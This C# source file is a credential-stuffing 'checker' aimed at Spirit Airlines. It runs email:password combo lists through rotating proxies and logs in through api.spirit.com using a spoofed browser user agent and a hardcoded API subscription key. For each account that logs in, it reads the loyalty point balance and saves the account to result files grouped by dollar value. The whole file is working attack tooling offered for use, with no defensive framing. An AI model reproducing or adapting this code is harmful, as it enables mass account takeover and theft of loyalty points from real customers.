using System;
using System.IO;
using System.Threading;
using Leaf.xNet;

namespace Spirit_Airlines.Core
{
    public static class Checker
    {
        private static readonly object Locker = new object();
        private static readonly Random Random = new Random();

        public static void Check(string account)
        {
            try
            {
                var accountData = account.Split(':', ';', '|');
                using var http = new HttpRequest
                {
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(Globals.EProxyType,
                        Globals.Proxies[Random.Next(0, Globals.Proxies.Count - 1)]),
                    ConnectTimeout = Globals.Timeout,
                    UserAgent =
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
                };

                http.AddHeader("Host", "api.spirit.com");
                http.AddHeader("Accept", "application/json, text/plain, */*");
                http.AddHeader("Ocp-Apim-Subscription-Key", "dc6844776fe84b1c8b68affe7deb7916");
                http.AddHeader("Referer", "https://www.spirit.com/");

                var resp = http.Post(
                    "https://api.spirit.com/nk-token/api/v1/token",
                    "{\"applicationName\":\"dotRezWeb\"}",
                    "application/json");
                var text = resp.ToString();

                if (text.Contains("\"token\":"))
                {
                    var token = Parse(text, "\"token\":\"", "\"");

                    http.Authorization = $"Bearer {token}";
                    http.AddHeader("Authorization", $"Bearer {token}");
                    http.AddHeader("Host", "api.spirit.com");
                    http.AddHeader("Accept", "application/json, text/plain, */*");
                    http.AddHeader("Ocp-Apim-Subscription-Key", "dc6844776fe84b1c8b68affe7deb7916");
                    http.AddHeader("User-Agent",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36");
                    http.AddHeader("Referer", "https://www.spirit.com/");
                    http.AddHeader("X-Ignore-Toast", "true");

                    var data = GetContent(accountData[0], accountData[1]);

                    var respTwo = http.Put(
                        "https://api.spirit.com/nk-token/api/nk/token",
                        data,
                        "application/json");
                    var textTwo = respTwo.ToString();

                    if (respTwo.StatusCode == HttpStatusCode.NoContent)
                    {
                        http.Authorization = $"Bearer {token}";
                        http.AddHeader("Authorization", $"Bearer {token}");
                        http.AddHeader("Accept", "application/json, text/plain, */*");
                        http.AddHeader("Ocp-Apim-Subscription-Key", "dc6844776fe84b1c8b68affe7deb7916");

                        var capture = http.Get("https://api.spirit.com/nk-account/api/Account/accountdetail");
                        var textThree = capture.ToString();

                        lock (Locker)
                        {
                            if (capture.StatusCode == HttpStatusCode.Forbidden)
                            {
                                Retry(account);
                                return;
                            }

                            if (textThree.Contains("pointBalance\":0"))
                            {
                                Custom(account, 0);
                                return;
                            }

                            var pointBalance = Convert.ToInt16(Parse(textThree, "\"pointBalance\":", ","));
                            var dollarValue = 0;

                            try
                            {
                                dollarValue = pointBalance / 100;
                            }
                            catch
                            {
                                // ignored
                            }

                            if (dollarValue < 50)
                            {
                                Stats.Checked++;
                                Custom(account, dollarValue);
                                return;
                            }

                            if (dollarValue < 100)
                            {
                                Stats._50++;
                                SaveData($"{account} | Balance = {dollarValue}", "50.txt");
                            }
                            else if (dollarValue < 150)
                            {
                                Stats._100++;
                                SaveData($"{account} | Balance = {dollarValue}", "100.txt");
                            }
                            else if (dollarValue < 200)
                            {
                                Stats._150++;
                                SaveData($"{account} | Balance = {dollarValue}", "150.txt");
                            }
                            else if (dollarValue < 250)
                            {
                                Stats._200++;
                                SaveData($"{account} | Balance = {dollarValue}", "200.txt");
                            }
                            else if (dollarValue < 300)
                            {
                                Stats._250++;
                                SaveData($"{account} | Balance = {dollarValue}", "250.txt");
                            }
                            else if (dollarValue < 350)
                            {
                                Stats._300++;
                                SaveData($"{account} | Balance = {dollarValue}", "300.txt");
                            }
                            else if (dollarValue < 400)
                            {
                                Stats._350++;
                                SaveData($"{account} | Balance = {dollarValue}", "350.txt");
                            }
                            else if (dollarValue < 450)
                            {
                                Stats._400++;
                                SaveData($"{account} | Balance = {dollarValue}", "400.txt");
                            }
                            else if (dollarValue < 500)
                            {
                                Stats._450++;
                                SaveData($"{account} | Balance = {dollarValue}", "450.txt");
                            }
                            else if (dollarValue < 550)
                            {
                                Stats._500++;
                                SaveData($"{account} | Balance = {dollarValue}", "500.txt");
                            }
                            else if (dollarValue < 600)
                            {
                                Stats._550++;
                                SaveData($"{account} | Balance = {dollarValue}", "550.txt");
                            }
                            else if (dollarValue < 650)
                            {
                                Stats._600++;
                                SaveData($"{account} | Balance = {dollarValue}", "600.txt");
                            }
                            else if (dollarValue < 700)
                            {
                                Stats._650++;
                                SaveData($"{account} | Balance = {dollarValue}", "650.txt");
                            }
                            else if (dollarValue < 750)
                            {
                                Stats._700++;
                                SaveData($"{account} | Balance = {dollarValue}", "700.txt");
                            }
                            else if (dollarValue < 800)
                            {
                                Stats._750++;
                                SaveData($"{account} | Balance = {dollarValue}", "750.txt");
                            }
                            else if (dollarValue < 850)
                            {
                                Stats._800++;
                                SaveData($"{account} | Balance = {dollarValue}", "800.txt");
                            }
                            else if (dollarValue < 900)
                            {
                                Stats._850++;
                                SaveData($"{account} | Balance = {dollarValue}", "850.txt");
                            }
                            else if (dollarValue < 950)
                            {
                                Stats._900++;
                                SaveData($"{account} | Balance = {dollarValue}", "900.txt");
                            }
                            else
                            {
                                Stats._1000m++;
                                SaveData($"{account} | Balance = {dollarValue}", "1k+.txt");
                            }

                                Stats.Working++;
                                SaveData($"{account} | Balance = {dollarValue}", "Working");
                                Console.WriteLine($"{Clr.LtGreen}[HIT] Balance = {dollarValue}{Clr.Reset}");

                            
                            
                           
                        }
                    }
                    else if (textTwo.Contains("Credentials:Failed"))
                    {
                        Invalid(account);
                    }
                    else
                    {
                        Stats.Banned++;
                        Retry(account);
                        return;
                    }

                    Stats.Checked++;
                }

                Stats.Banned++;
            }
            catch (Exception ex)
            {
                if (ex is IndexOutOfRangeException)
                {
                    Invalid(account);
                    return;
                }

                Retry(account);
            }
        }

        private static string GetContent(string email, string password)
        {
            var data = "{\"credentials\":{\"username\":\"" + email + "\", \"password\":\"" +
                       password + "\", \"domain\":\"WWW\",\"applicationName\":\"dotRezWeb\"}}";
            return data;
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new[]
            {
                left
            }, StringSplitOptions.None)[1].Split(new[]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static void TitleUpdater()
        {
            while (!Stats.Finished)
            {
                Console.Title =
                    $"SpiritAirLines | Progress: ({Stats.Checked}/{Stats.ComboCount}) - Hits: {Stats.Working} - Custom: {Stats.Custom} - Bad: {Stats.Invalid} - Retries: {Stats.Retries} - Banned: {Stats.Banned} - CPM: {Stats.Cpm}";
                Thread.Sleep(500);
            }
        }

        public static void CpmCounter()
        {
            while (!Stats.Finished)
            {
                var now = Stats.Checked;
                Thread.Sleep(1000);
                Stats.Cpm = (Stats.Checked - now) * 60;
            }
        }

        private static void Invalid(string account)
        {
            lock (Locker)
            {
                Stats.Invalid++;
                SaveData(account, "Bad");

                if (Globals.OutputBad == 1)
                    Console.WriteLine($"{Clr.LtRed}[BAD] {account}{Clr.Reset}");
            }
        }

        private static void Custom(string account, int balance)
        {
            Stats.Custom++;
            SaveData($"{account} | Balance = {balance}", "Custom");
            if (Globals.OutputCustom == 1)
                Console.WriteLine($"{Clr.LtYellow}[Custom] {account} | Balance = {balance}{Clr.Reset}");
        }

        private static void Retry(string account)
        {
            Stats.Retries++;
            Globals.Queue.Add(account);
        }

        private static void SaveData(string data, string fileName)
        {
            var path = $"{Globals.ResultsPath}\\{fileName}.txt";
            using var writer = new StreamWriter(path, true);
            writer.WriteLine(data);
        }
    }
}